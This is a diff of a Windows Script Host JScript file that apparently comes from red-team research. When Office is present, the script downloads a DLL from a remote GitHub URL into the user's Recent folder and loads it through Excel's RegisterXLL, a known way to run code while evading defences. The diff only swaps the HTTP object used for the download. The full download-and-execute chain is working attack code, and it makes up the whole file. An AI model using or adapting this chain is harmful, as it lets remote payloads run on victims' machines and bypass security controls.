@@ -1,21 +1,22 @@
-var FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
+FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
 if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
 {   
 	WScript.Echo("[+] Find Microsoft Office."); 
-	WScript.Echo("[+] Download file ...");
-	var sGet=new ActiveXObject("ADODB.Stream");
-	var xGet=null;
-	xGet=new ActiveXObject("Msxml2.XMLHTTP");
-	xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);
-	xGet.Send();
-	sGet.Type=1;
-	sGet.Open();
-	sGet.Write(xGet.ResponseBody);
-	sGet.SaveToFile((WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll"),2);
+	WScript.Echo("[+] Download file...");
+	h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+	h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
+	h.Send();
+	s=new ActiveXObject("ADODB.Stream");
+	s.Type=1;
+	s.Open();
+	s.Write(h.ResponseBody);
+	x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
+	s.SaveToFile(x,2);
+
 	WScript.Echo("[+] Download Success.");
-	WScript.Echo("[+] Load dll ...");	 
-	var excel = new ActiveXObject("Excel.Application");
-	excel.RegisterXLL(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll");
+	WScript.Echo("[+] Load dll...");	 
+	e= new ActiveXObject("Excel.Application");
+	e.RegisterXLL(x);
 	WScript.Echo("[+] Load dll Success.");	  
 }
 else
